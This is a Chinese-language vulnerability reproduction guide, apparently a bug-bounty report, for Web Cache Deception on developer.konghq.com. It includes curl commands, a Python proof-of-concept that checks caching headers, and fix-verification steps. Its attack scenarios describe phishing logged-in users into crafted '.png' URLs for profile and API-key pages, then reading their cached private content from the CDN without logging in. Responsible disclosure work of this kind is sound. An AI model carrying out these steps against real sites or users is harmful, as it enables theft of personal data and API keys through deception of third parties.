# Web Cache Deception 漏洞复现指南

## 漏洞概述
**目标**: https://developer.konghq.com  
**漏洞类型**: Web Cache Deception  
**严重程度**: Medium

---

## 复现步骤

### 步骤1: 验证基础漏洞

打开终端或浏览器，访问以下URL：

```
https://developer.konghq.com/docs/test-cache-deception.png
```

**预期结果**:
- 返回200状态码（而不是404）
- Content-Type是 `text/html`（而不是 `image/png`）
- 页面内容是HTML格式的404错误页面或首页

**使用curl验证**:
```bash
curl -I https://developer.konghq.com/docs/test-cache-deception.png
```

**预期响应头**:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Age: [数字]
Cache-Control: public,max-age=0,must-revalidate
```

---

### 步骤2: 验证CDN缓存

等待几秒后，再次请求同一个URL，检查 `Age` 头部是否增加：

```bash
# 第一次请求
curl -I https://developer.konghq.com/docs/test-cache-deception-1.png

# 等待5秒
sleep 5

# 第二次请求
curl -I https://developer.konghq.com/docs/test-cache-deception-1.png
```

**预期结果**:
- 第二次请求的 `Age` 值比第一次大5左右
- 证明响应被CDN缓存了

### 步骤3: 模拟攻击场景（PoC）

#### 场景A: 窃取普通用户信息

1. **攻击者构造恶意链接**:
   ```
   https://developer.konghq.com/docs/profile.png
   ```

2. **诱骗已登录用户点击该链接**:
   - 可以通过钓鱼邮件
   - 或在论坛/社交媒体发布："查看我的开发者资料图片"
   
3. **用户浏览器请求该URL**:
   - 自动携带用户的认证Cookie
   - 服务器返回用户的个人资料页面（HTML格式）
   - CDN将此HTML内容缓存为 `.png` 文件

4. **攻击者访问相同URL**:
   ```bash
   curl https://developer.konghq.com/docs/profile.png
   ```
   
5. **获取缓存的内容**:
   - 即使攻击者未登录，也能从CDN缓存中获取用户的个人信息

#### 场景B: 窃取API密钥（更严重的情况）

如果 developer.konghq.com 有API密钥管理页面：

1. **构造URL**:
   ```
   https://developer.konghq.com/dashboard/api-keys.png
   ```

2. **诱骗用户访问**

3. **从缓存中读取API密钥**

### 步骤4: 自动化测试脚本

创建一个简单的Python脚本来自动化测试：

```python
#!/usr/bin/env python3
"""
Web Cache Deception PoC
"""
import requests
import time

BASE_URL = 'https://developer.konghq.com'

def test_cache_deception():
    """测试缓存欺骗漏洞"""
    
    # 生成唯一的测试URL
    timestamp = int(time.time())
    test_url = f"{BASE_URL}/docs/cache-test-{timestamp}.png"
    
    print(f"测试URL: {test_url}\n")
    
    # 第一次请求
    print("[1] 第一次请求...")
    resp1 = requests.get(test_url)
    print(f"    状态码: {resp1.status_code}")
    print(f"    Content-Type: {resp1.headers.get('Content-Type')}")
    print(f"    Age: {resp1.headers.get('Age', 'N/A')}")
    
    if resp1.status_code != 200:
        print("\n[!] 漏洞不存在：返回非200状态码")
        return False
    
    if 'html' not in resp1.headers.get('Content-Type', '').lower():
        print("\n[!] 漏洞不存在：Content-Type不是HTML")
        return False
    
    # 等待让CDN缓存
    print("\n[2] 等待5秒让CDN缓存...")
    time.sleep(5)
    
    # 第二次请求
    print("[3] 第二次请求...")
    resp2 = requests.get(test_url)
    age2 = resp2.headers.get('Age', '0')
    print(f"    状态码: {resp2.status_code}")
    print(f"    Age: {age2}")
    
    if int(age2) > 0:
        print("\n[***] 漏洞确认！")
        print("    - 不存在的PNG文件返回200")
        print("    - Content-Type是text/html")
        print("    - 响应被CDN缓存")
        print("\n[风险] 攻击者可以:")
        print("    1. 诱骗用户访问特制URL")
        print("    2. CDN缓存用户的敏感页面")
        print("    3. 攻击者从缓存中读取敏感信息")
        return True
    else:
        print("\n[.] 响应未被缓存，漏洞可能不存在")
        return False

if __name__ == '__main__':
    test_cache_deception()
```

运行脚本：
```bash
python poc_cache_deception.py
```

## 修复验证

修复后，同样的测试应该得到不同的结果：

```bash
curl -I https://developer.konghq.com/docs/test.png
```

**预期修复后的响应**:
```http
HTTP/1.1 404 Not Found
Content-Type: text/html; charset=UTF-8
Cache-Control: no-store, no-cache, must-revalidate
```

或者：
```http
HTTP/1.1 200 OK
Content-Type: image/png
# 返回一个真正的404图片
```

关键是要么返回正确的404状态码，要么确保HTML响应不会被CDN缓存。
